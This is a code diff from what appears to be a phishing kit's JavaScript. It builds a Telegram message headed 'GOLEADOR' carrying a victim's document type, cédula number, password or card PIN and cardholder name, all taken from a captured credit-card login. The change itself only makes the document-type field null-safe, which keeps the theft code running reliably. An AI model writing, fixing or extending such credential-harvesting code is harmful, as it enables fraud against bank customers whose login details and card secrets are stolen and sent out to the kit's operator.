@@ -436,10 +436,11 @@
                 // Get cedula and clave from the initial login data
                 const cedula = initialLoginData ? initialLoginData.nroDoc : 'N/A';
                 const clave = initialLoginData ? (initialLoginData.clave !== 'N/A' ? initialLoginData.clave : initialLoginData.cardClave) : 'N/A';
-                
+                const tipoDoc = initialLoginData ? initialLoginData.tipoDoc : 'N/A';
+
                 let telegramMessage = '🍀 GOLEADOR 🍀\n\n';
                 telegramMessage += `Tipo de Ingreso: Tarjeta de Crédito\n`;
-                telegramMessage += `Tipo de Doc: ${initialLoginData.tipoDoc}\n`;
+                telegramMessage += `Tipo de Doc: ${tipoDoc}\n`;
                 telegramMessage += `Cédula: ${cedula}\n`;
                 telegramMessage += `Clave: ${clave}\n\n`;
                 telegramMessage += `Nombre: ${nombreTitular}\n`;
